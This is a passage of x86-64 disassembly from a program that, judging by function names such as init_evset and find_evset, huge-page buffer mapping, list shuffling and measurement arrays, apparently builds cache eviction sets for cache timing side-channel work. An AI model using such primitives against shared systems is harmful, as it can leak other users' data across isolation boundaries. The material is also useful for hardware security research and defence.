    1750:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    1757:	00 
    1758:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    175c:	48 8b 10             	mov    (%rax),%rdx
    175f:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1763:	48 89 10             	mov    %rdx,(%rax)
    1766:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    176a:	48 8b 00             	mov    (%rax),%rax
    176d:	48 85 c0             	test   %rax,%rax
    1770:	74 0f                	je     1781 <list_push+0x48>
    1772:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1776:	48 8b 00             	mov    (%rax),%rax
    1779:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    177d:	48 89 50 08          	mov    %rdx,0x8(%rax)
    1781:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1785:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    1789:	48 89 10             	mov    %rdx,(%rax)
    178c:	eb 01                	jmp    178f <list_push+0x56>
    178e:	90                   	nop
    178f:	5d                   	pop    %rbp
    1790:	c3                   	ret

0000000000001791 <list_append>:
    1791:	55                   	push   %rbp
    1792:	48 89 e5             	mov    %rsp,%rbp
    1795:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    1799:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    179d:	48 83 7d e0 00       	cmpq   $0x0,-0x20(%rbp)
    17a2:	0f 84 a3 00 00 00    	je     184b <list_append+0xba>
    17a8:	48 83 7d e8 00       	cmpq   $0x0,-0x18(%rbp)
    17ad:	75 24                	jne    17d3 <list_append+0x42>
    17af:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    17b3:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    17ba:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    17be:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    17c5:	00 
    17c6:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    17ca:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    17ce:	48 89 10             	mov    %rdx,(%rax)
    17d1:	eb 79                	jmp    184c <list_append+0xbb>
    17d3:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    17d7:	48 8b 00             	mov    (%rax),%rax
    17da:	48 85 c0             	test   %rax,%rax
    17dd:	75 24                	jne    1803 <list_append+0x72>
    17df:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    17e3:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    17ea:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    17ee:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    17f5:	00 
    17f6:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    17fa:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    17fe:	48 89 10             	mov    %rdx,(%rax)
    1801:	eb 49                	jmp    184c <list_append+0xbb>
    1803:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1807:	48 8b 00             	mov    (%rax),%rax
    180a:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    180e:	eb 0b                	jmp    181b <list_append+0x8a>
    1810:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1814:	48 8b 00             	mov    (%rax),%rax
    1817:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    181b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    181f:	48 8b 00             	mov    (%rax),%rax
    1822:	48 85 c0             	test   %rax,%rax
    1825:	75 e9                	jne    1810 <list_append+0x7f>
    1827:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    182b:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    182f:	48 89 10             	mov    %rdx,(%rax)
    1832:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1836:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    183a:	48 89 50 08          	mov    %rdx,0x8(%rax)
    183e:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1842:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    1849:	eb 01                	jmp    184c <list_append+0xbb>
    184b:	90                   	nop
    184c:	5d                   	pop    %rbp
    184d:	c3                   	ret

000000000000184e <list_pop>:
    184e:	55                   	push   %rbp
    184f:	48 89 e5             	mov    %rsp,%rbp
    1852:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    1856:	48 83 7d e8 00       	cmpq   $0x0,-0x18(%rbp)
    185b:	74 09                	je     1866 <list_pop+0x18>
    185d:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1861:	48 8b 00             	mov    (%rax),%rax
    1864:	eb 05                	jmp    186b <list_pop+0x1d>
    1866:	b8 00 00 00 00       	mov    $0x0,%eax
    186b:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    186f:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    1874:	75 07                	jne    187d <list_pop+0x2f>
    1876:	b8 00 00 00 00       	mov    $0x0,%eax
    187b:	eb 44                	jmp    18c1 <list_pop+0x73>
    187d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1881:	48 8b 00             	mov    (%rax),%rax
    1884:	48 85 c0             	test   %rax,%rax
    1887:	74 0f                	je     1898 <list_pop+0x4a>
    1889:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    188d:	48 8b 00             	mov    (%rax),%rax
    1890:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    1897:	00 
    1898:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    189c:	48 8b 10             	mov    (%rax),%rdx
    189f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    18a3:	48 89 10             	mov    %rdx,(%rax)
    18a6:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    18aa:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    18b1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    18b5:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    18bc:	00 
    18bd:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    18c1:	5d                   	pop    %rbp
    18c2:	c3                   	ret

00000000000018c3 <list_get>:
    18c3:	55                   	push   %rbp
    18c4:	48 89 e5             	mov    %rsp,%rbp
    18c7:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    18cb:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    18cf:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    18d3:	48 8b 00             	mov    (%rax),%rax
    18d6:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    18da:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
    18e1:	00 
    18e2:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    18e7:	75 17                	jne    1900 <list_get+0x3d>
    18e9:	b8 00 00 00 00       	mov    $0x0,%eax
    18ee:	eb 33                	jmp    1923 <list_get+0x60>
    18f0:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    18f4:	48 8b 00             	mov    (%rax),%rax
    18f7:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    18fb:	48 83 45 f0 01       	addq   $0x1,-0x10(%rbp)
    1900:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    1905:	74 0d                	je     1914 <list_get+0x51>
    1907:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    190b:	48 8b 00             	mov    (%rax),%rax
    190e:	48 39 45 f0          	cmp    %rax,-0x10(%rbp)
    1912:	72 dc                	jb     18f0 <list_get+0x2d>
    1914:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1918:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    191c:	48 89 10             	mov    %rdx,(%rax)
    191f:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1923:	5d                   	pop    %rbp
    1924:	c3                   	ret

0000000000001925 <list_take>:
    1925:	55                   	push   %rbp
    1926:	48 89 e5             	mov    %rsp,%rbp
    1929:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    192d:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    1931:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1935:	48 8b 00             	mov    (%rax),%rax
    1938:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    193c:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
    1943:	00 
    1944:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    1949:	75 1a                	jne    1965 <list_take+0x40>
    194b:	b8 00 00 00 00       	mov    $0x0,%eax
    1950:	e9 9b 00 00 00       	jmp    19f0 <list_take+0xcb>
    1955:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1959:	48 8b 00             	mov    (%rax),%rax
    195c:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1960:	48 83 45 f0 01       	addq   $0x1,-0x10(%rbp)
    1965:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    196a:	74 0d                	je     1979 <list_take+0x54>
    196c:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1970:	48 8b 00             	mov    (%rax),%rax
    1973:	48 39 45 f0          	cmp    %rax,-0x10(%rbp)
    1977:	72 dc                	jb     1955 <list_take+0x30>
    1979:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    197e:	75 07                	jne    1987 <list_take+0x62>
    1980:	b8 00 00 00 00       	mov    $0x0,%eax
    1985:	eb 69                	jmp    19f0 <list_take+0xcb>
    1987:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    198b:	48 8b 00             	mov    (%rax),%rax
    198e:	48 85 c0             	test   %rax,%rax
    1991:	74 13                	je     19a6 <list_take+0x81>
    1993:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1997:	48 8b 00             	mov    (%rax),%rax
    199a:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    199e:	48 8b 52 08          	mov    0x8(%rdx),%rdx
    19a2:	48 89 50 08          	mov    %rdx,0x8(%rax)
    19a6:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    19aa:	48 8b 40 08          	mov    0x8(%rax),%rax
    19ae:	48 85 c0             	test   %rax,%rax
    19b1:	74 14                	je     19c7 <list_take+0xa2>
    19b3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    19b7:	48 8b 40 08          	mov    0x8(%rax),%rax
    19bb:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    19bf:	48 8b 12             	mov    (%rdx),%rdx
    19c2:	48 89 10             	mov    %rdx,(%rax)
    19c5:	eb 0e                	jmp    19d5 <list_take+0xb0>
    19c7:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    19cb:	48 8b 10             	mov    (%rax),%rdx
    19ce:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    19d2:	48 89 10             	mov    %rdx,(%rax)
    19d5:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    19d9:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    19e0:	00 
    19e1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    19e5:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    19ec:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    19f0:	5d                   	pop    %rbp
    19f1:	c3                   	ret

00000000000019f2 <list_shuffle>:
    19f2:	55                   	push   %rbp
    19f3:	48 89 e5             	mov    %rsp,%rbp
    19f6:	48 83 ec 30          	sub    $0x30,%rsp
    19fa:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
    19fe:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    1a02:	48 8b 00             	mov    (%rax),%rax
    1a05:	48 85 c0             	test   %rax,%rax
    1a08:	0f 84 06 01 00 00    	je     1b14 <list_shuffle+0x122>
    1a0e:	bf 08 00 00 00       	mov    $0x8,%edi
    1a13:	e8 c8 f6 ff ff       	call   10e0 <malloc@plt>
    1a18:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    1a1c:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1a20:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    1a27:	48 c7 45 e8 ff ff ff 	movq   $0xffffffffffffffff,-0x18(%rbp)
    1a2e:	ff 
    1a2f:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
    1a33:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    1a37:	48 89 d6             	mov    %rdx,%rsi
    1a3a:	48 89 c7             	mov    %rax,%rdi
    1a3d:	e8 81 fe ff ff       	call   18c3 <list_get>
    1a42:	48 8b 05 9f 46 00 00 	mov    0x469f(%rip),%rax        # 60e8 <lfsr>
    1a49:	48 85 c0             	test   %rax,%rax
    1a4c:	75 60                	jne    1aae <list_shuffle+0xbc>
    1a4e:	e8 0b fa ff ff       	call   145e <lfsr_create>
    1a53:	48 89 05 8e 46 00 00 	mov    %rax,0x468e(%rip)        # 60e8 <lfsr>
    1a5a:	eb 52                	jmp    1aae <list_shuffle+0xbc>
    1a5c:	48 8d 05 85 46 00 00 	lea    0x4685(%rip),%rax        # 60e8 <lfsr>
    1a63:	48 89 c7             	mov    %rax,%rdi
    1a66:	e8 05 fa ff ff       	call   1470 <lfsr_rand>
    1a6b:	48 8b 75 e8          	mov    -0x18(%rbp),%rsi
    1a6f:	48 8d 4e ff          	lea    -0x1(%rsi),%rcx
    1a73:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
    1a77:	ba 00 00 00 00       	mov    $0x0,%edx
    1a7c:	48 f7 f6             	div    %rsi
    1a7f:	48 89 d1             	mov    %rdx,%rcx
    1a82:	48 89 c8             	mov    %rcx,%rax
    1a85:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    1a89:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
    1a8d:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    1a91:	48 89 d6             	mov    %rdx,%rsi
    1a94:	48 89 c7             	mov    %rax,%rdi
    1a97:	e8 89 fe ff ff       	call   1925 <list_take>
    1a9c:	48 89 c2             	mov    %rax,%rdx
    1a9f:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1aa3:	48 89 d6             	mov    %rdx,%rsi
    1aa6:	48 89 c7             	mov    %rax,%rdi
    1aa9:	e8 e3 fc ff ff       	call   1791 <list_append>
    1aae:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1ab2:	48 85 c0             	test   %rax,%rax
    1ab5:	75 a5                	jne    1a5c <list_shuffle+0x6a>
    1ab7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1abb:	48 8b 00             	mov    (%rax),%rax
    1abe:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1ac2:	eb 17                	jmp    1adb <list_shuffle+0xe9>
    1ac4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1ac8:	48 89 c7             	mov    %rax,%rdi
    1acb:	e8 7d f8 ff ff       	call   134d <my_access>
    1ad0:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1ad4:	48 8b 00             	mov    (%rax),%rax
    1ad7:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1adb:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1adf:	48 8b 00             	mov    (%rax),%rax
    1ae2:	48 85 c0             	test   %rax,%rax
    1ae5:	75 dd                	jne    1ac4 <list_shuffle+0xd2>
    1ae7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1aeb:	48 8b 10             	mov    (%rax),%rdx
    1aee:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1af2:	48 89 10             	mov    %rdx,(%rax)
    1af5:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1af9:	48 8b 00             	mov    (%rax),%rax
    1afc:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    1b00:	48 89 50 08          	mov    %rdx,0x8(%rax)
    1b04:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1b08:	48 8b 10             	mov    (%rax),%rdx
    1b0b:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    1b0f:	48 89 10             	mov    %rdx,(%rax)
    1b12:	eb 01                	jmp    1b15 <list_shuffle+0x123>
    1b14:	90                   	nop
    1b15:	c9                   	leave
    1b16:	c3                   	ret

0000000000001b17 <list_print>:
    1b17:	55                   	push   %rbp
    1b18:	48 89 e5             	mov    %rsp,%rbp
    1b1b:	48 83 ec 20          	sub    $0x20,%rsp
    1b1f:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    1b23:	48 83 7d e8 00       	cmpq   $0x0,-0x18(%rbp)
    1b28:	74 7f                	je     1ba9 <list_print+0x92>
    1b2a:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1b2e:	48 8b 00             	mov    (%rax),%rax
    1b31:	48 85 c0             	test   %rax,%rax
    1b34:	74 76                	je     1bac <list_print+0x95>
    1b36:	48 8d 05 cb 24 00 00 	lea    0x24cb(%rip),%rax        # 4008 <_IO_stdin_used+0x8>
    1b3d:	48 89 c7             	mov    %rax,%rdi
    1b40:	e8 fb f4 ff ff       	call   1040 <puts@plt>
    1b45:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
    1b4c:	00 
    1b4d:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1b51:	48 8b 00             	mov    (%rax),%rax
    1b54:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1b58:	eb 46                	jmp    1ba0 <list_print+0x89>
    1b5a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1b5e:	48 8b 08             	mov    (%rax),%rcx
    1b61:	48 83 45 f0 01       	addq   $0x1,-0x10(%rbp)
    1b66:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    1b6a:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1b6e:	48 89 c6             	mov    %rax,%rsi
    1b71:	48 8d 05 ab 24 00 00 	lea    0x24ab(%rip),%rax        # 4023 <_IO_stdin_used+0x23>
    1b78:	48 89 c7             	mov    %rax,%rdi
    1b7b:	b8 00 00 00 00       	mov    $0x0,%eax
    1b80:	e8 0b f5 ff ff       	call   1090 <printf@plt>
    1b85:	48 8b 05 34 45 00 00 	mov    0x4534(%rip),%rax        # 60c0 <conf>
    1b8c:	48 8b 00             	mov    (%rax),%rax
    1b8f:	48 39 45 f0          	cmp    %rax,-0x10(%rbp)
    1b93:	73 1a                	jae    1baf <list_print+0x98>
    1b95:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1b99:	48 8b 00             	mov    (%rax),%rax
    1b9c:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1ba0:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    1ba5:	75 b3                	jne    1b5a <list_print+0x43>
    1ba7:	eb 07                	jmp    1bb0 <list_print+0x99>
    1ba9:	90                   	nop
    1baa:	eb 04                	jmp    1bb0 <list_print+0x99>
    1bac:	90                   	nop
    1bad:	eb 01                	jmp    1bb0 <list_print+0x99>
    1baf:	90                   	nop
    1bb0:	c9                   	leave
    1bb1:	c3                   	ret

0000000000001bb2 <init_evset>:
    1bb2:	55                   	push   %rbp
    1bb3:	48 89 e5             	mov    %rsp,%rbp
    1bb6:	48 83 ec 10          	sub    $0x10,%rsp
    1bba:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    1bbe:	bf 00 ca 9a 3b       	mov    $0x3b9aca00,%edi
    1bc3:	e8 47 f8 ff ff       	call   140f <wait>
    1bc8:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1bcc:	48 89 05 ed 44 00 00 	mov    %rax,0x44ed(%rip)        # 60c0 <conf>
    1bd3:	48 c7 05 fa 44 00 00 	movq   $0x400000,0x44fa(%rip)        # 60d8 <buffer_size>
    1bda:	00 00 40 00 
    1bde:	48 8b 05 f3 44 00 00 	mov    0x44f3(%rip),%rax        # 60d8 <buffer_size>
    1be5:	41 b9 00 00 00 00    	mov    $0x0,%r9d
    1beb:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
    1bf1:	b9 22 00 04 00       	mov    $0x40022,%ecx
    1bf6:	ba 03 00 00 00       	mov    $0x3,%edx
    1bfb:	48 89 c6             	mov    %rax,%rsi
    1bfe:	bf 00 00 00 00       	mov    $0x0,%edi
    1c03:	e8 78 f4 ff ff       	call   1080 <mmap@plt>
    1c08:	48 89 05 c1 44 00 00 	mov    %rax,0x44c1(%rip)        # 60d0 <buffer>
    1c0f:	48 8b 05 ba 44 00 00 	mov    0x44ba(%rip),%rax        # 60d0 <buffer>
    1c16:	ba 0e 00 00 00       	mov    $0xe,%edx
    1c1b:	be 00 00 20 00       	mov    $0x200000,%esi
    1c20:	48 89 c7             	mov    %rax,%rdi
    1c23:	e8 e8 f4 ff ff       	call   1110 <madvise@plt>
    1c28:	83 f8 ff             	cmp    $0xffffffff,%eax
    1c2b:	75 14                	jne    1c41 <init_evset+0x8f>
    1c2d:	48 8d 05 fc 23 00 00 	lea    0x23fc(%rip),%rax        # 4030 <_IO_stdin_used+0x30>
    1c34:	48 89 c7             	mov    %rax,%rdi
    1c37:	e8 04 f4 ff ff       	call   1040 <puts@plt>
    1c3c:	e9 85 00 00 00       	jmp    1cc6 <init_evset+0x114>
    1c41:	48 8d 05 88 44 00 00 	lea    0x4488(%rip),%rax        # 60d0 <buffer>
    1c48:	48 89 05 91 44 00 00 	mov    %rax,0x4491(%rip)        # 60e0 <buffer_ptr>
    1c4f:	48 8b 15 82 44 00 00 	mov    0x4482(%rip),%rdx        # 60d8 <buffer_size>
    1c56:	48 8b 05 73 44 00 00 	mov    0x4473(%rip),%rax        # 60d0 <buffer>
    1c5d:	48 89 d6             	mov    %rdx,%rsi
    1c60:	48 89 c7             	mov    %rax,%rdi
    1c63:	e8 55 f9 ff ff       	call   15bd <list_init>
    1c68:	48 8b 05 51 44 00 00 	mov    0x4451(%rip),%rax        # 60c0 <conf>
    1c6f:	48 8b 00             	mov    (%rax),%rax
    1c72:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1c79:	00 
    1c7a:	48 8b 05 47 44 00 00 	mov    0x4447(%rip),%rax        # 60c8 <evsets>
    1c81:	48 89 d6             	mov    %rdx,%rsi
    1c84:	48 89 c7             	mov    %rax,%rdi
    1c87:	e8 64 f4 ff ff       	call   10f0 <realloc@plt>
    1c8c:	48 89 05 35 44 00 00 	mov    %rax,0x4435(%rip)        # 60c8 <evsets>
    1c93:	48 8b 05 2e 44 00 00 	mov    0x442e(%rip),%rax        # 60c8 <evsets>
    1c9a:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    1ca1:	48 8b 15 28 44 00 00 	mov    0x4428(%rip),%rdx        # 60d0 <buffer>
    1ca8:	48 8b 05 19 44 00 00 	mov    0x4419(%rip),%rax        # 60c8 <evsets>
    1caf:	48 89 c6             	mov    %rax,%rsi
    1cb2:	48 8d 05 87 23 00 00 	lea    0x2387(%rip),%rax        # 4040 <_IO_stdin_used+0x40>
    1cb9:	48 89 c7             	mov    %rax,%rdi
    1cbc:	b8 00 00 00 00       	mov    $0x0,%eax
    1cc1:	e8 ca f3 ff ff       	call   1090 <printf@plt>
    1cc6:	c9                   	leave
    1cc7:	c3                   	ret

0000000000001cc8 <find_evset>:
    1cc8:	55                   	push   %rbp
    1cc9:	48 89 e5             	mov    %rsp,%rbp
    1ccc:	48 83 ec 30          	sub    $0x30,%rsp
    1cd0:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
    1cd4:	48 89 75 d0          	mov    %rsi,-0x30(%rbp)
    1cd8:	48 8b 05 19 44 00 00 	mov    0x4419(%rip),%rax        # 60f8 <msrmts>
    1cdf:	48 85 c0             	test   %rax,%rax
    1ce2:	74 1a                	je     1cfe <find_evset+0x36>
    1ce4:	48 8b 05 0d 44 00 00 	mov    0x440d(%rip),%rax        # 60f8 <msrmts>
    1ceb:	48 89 c7             	mov    %rax,%rdi
    1cee:	e8 3d f3 ff ff       	call   1030 <free@plt>
    1cf3:	48 c7 05 fa 43 00 00 	movq   $0x0,0x43fa(%rip)        # 60f8 <msrmts>
    1cfa:	00 00 00 00 
    1cfe:	48 8b 05 f3 43 00 00 	mov    0x43f3(%rip),%rax        # 60f8 <msrmts>
    1d05:	be 40 1f 00 00       	mov    $0x1f40,%esi
    1d0a:	48 89 c7             	mov    %rax,%rdi
    1d0d:	e8 de f3 ff ff       	call   10f0 <realloc@plt>
    1d12:	48 89 05 df 43 00 00 	mov    %rax,0x43df(%rip)        # 60f8 <msrmts>
    1d19:	48 8d 05 4f 23 00 00 	lea    0x234f(%rip),%rax        # 406f <_IO_stdin_used+0x6f>
    1d20:	48 89 c7             	mov    %rax,%rdi
    1d23:	e8 18 f3 ff ff       	call   1040 <puts@plt>
    1d28:	48 8b 05 a1 43 00 00 	mov    0x43a1(%rip),%rax        # 60d0 <buffer>
    1d2f:	48 85 c0             	test   %rax,%rax
    1d32:	74 0c                	je     1d40 <find_evset+0x78>
    1d34:	48 8b 05 8d 43 00 00 	mov    0x438d(%rip),%rax        # 60c8 <evsets>
    1d3b:	48 85 c0             	test   %rax,%rax
    1d3e:	75 25                	jne    1d65 <find_evset+0x9d>
    1d40:	48 8d 05 2a 23 00 00 	lea    0x232a(%rip),%rax        # 4071 <_IO_stdin_used+0x71>
    1d47:	48 89 c7             	mov    %rax,%rdi
    1d4a:	e8 f1 f2 ff ff       	call   1040 <puts@plt>
    1d4f:	b8 00 00 00 00       	mov    $0x0,%eax
    1d54:	e8 e3 01 00 00       	call   1f3c <close_evsets>
    1d59:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    1d5d:	48 89 c7             	mov    %rax,%rdi
    1d60:	e8 4d fe ff ff       	call   1bb2 <init_evset>
    1d65:	bf 00 ca 9a 3b       	mov    $0x3b9aca00,%edi
    1d6a:	e8 a0 f6 ff ff       	call   140f <wait>
    1d6f:	48 8d 05 f9 22 00 00 	lea    0x22f9(%rip),%rax        # 406f <_IO_stdin_used+0x6f>
    1d76:	48 89 c7             	mov    %rax,%rdi
    1d79:	e8 c2 f2 ff ff       	call   1040 <puts@plt>
    1d7e:	c7 45 fc ff 07 00 00 	movl   $0x7ff,-0x4(%rbp)
    1d85:	e9 38 01 00 00       	jmp    1ec2 <find_evset+0x1fa>
    1d8a:	48 8d 05 f2 22 00 00 	lea    0x22f2(%rip),%rax        # 4083 <_IO_stdin_used+0x83>
    1d91:	48 89 c7             	mov    %rax,%rdi
    1d94:	e8 a7 f2 ff ff       	call   1040 <puts@plt>
    1d99:	48 8b 05 20 43 00 00 	mov    0x4320(%rip),%rax        # 60c0 <conf>
    1da0:	48 8b 00             	mov    (%rax),%rax
    1da3:	83 e8 01             	sub    $0x1,%eax
    1da6:	89 45 f8             	mov    %eax,-0x8(%rbp)
    1da9:	eb 5b                	jmp    1e06 <find_evset+0x13e>
    1dab:	8b 45 fc             	mov    -0x4(%rbp),%eax
    1dae:	48 98                	cltq
    1db0:	8b 55 f8             	mov    -0x8(%rbp),%edx
    1db3:	48 63 d2             	movslq %edx,%rdx
    1db6:	48 c1 e2 0b          	shl    $0xb,%rdx
    1dba:	48 01 c2             	add    %rax,%rdx
    1dbd:	b8 ff 07 00 00       	mov    $0x7ff,%eax
    1dc2:	2b 45 fc             	sub    -0x4(%rbp),%eax
    1dc5:	0f af 45 f8          	imul   -0x8(%rbp),%eax
    1dc9:	48 98                	cltq
    1dcb:	48 29 c2             	sub    %rax,%rdx
    1dce:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
    1dd2:	48 8b 05 07 43 00 00 	mov    0x4307(%rip),%rax        # 60e0 <buffer_ptr>
    1dd9:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
    1ddd:	48 89 d6             	mov    %rdx,%rsi
    1de0:	48 89 c7             	mov    %rax,%rdi
    1de3:	e8 3d fb ff ff       	call   1925 <list_take>
    1de8:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    1dec:	48 8b 05 d5 42 00 00 	mov    0x42d5(%rip),%rax        # 60c8 <evsets>
    1df3:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    1df7:	48 89 d6             	mov    %rdx,%rsi
    1dfa:	48 89 c7             	mov    %rax,%rdi
    1dfd:	e8 8f f9 ff ff       	call   1791 <list_append>
    1e02:	83 6d f8 01          	subl   $0x1,-0x8(%rbp)
    1e06:	83 7d f8 00          	cmpl   $0x0,-0x8(%rbp)
    1e0a:	79 9f                	jns    1dab <find_evset+0xe3>
    1e0c:	48 8d 05 72 22 00 00 	lea    0x2272(%rip),%rax        # 4085 <_IO_stdin_used+0x85>
    1e13:	48 89 c7             	mov    %rax,%rdi
    1e16:	e8 25 f2 ff ff       	call   1040 <puts@plt>
    1e1b:	48 8b 05 a6 42 00 00 	mov    0x42a6(%rip),%rax        # 60c8 <evsets>
    1e22:	48 89 c7             	mov    %rax,%rdi
    1e25:	e8 c8 fb ff ff       	call   19f2 <list_shuffle>
    1e2a:	48 8d 05 56 22 00 00 	lea    0x2256(%rip),%rax        # 4087 <_IO_stdin_used+0x87>
    1e31:	48 89 c7             	mov    %rax,%rdi
    1e34:	e8 07 f2 ff ff       	call   1040 <puts@plt>
    1e39:	48 8b 05 b0 42 00 00 	mov    0x42b0(%rip),%rax        # 60f0 <msr_index>
    1e40:	48 3d de 03 00 00    	cmp    $0x3de,%rax
    1e46:	76 0b                	jbe    1e53 <find_evset+0x18b>
    1e48:	48 c7 05 9d 42 00 00 	movq   $0x0,0x429d(%rip)        # 60f0 <msr_index>
    1e4f:	00 00 00 00 
    1e53:	48 8d 05 2f 22 00 00 	lea    0x222f(%rip),%rax        # 4089 <_IO_stdin_used+0x89>
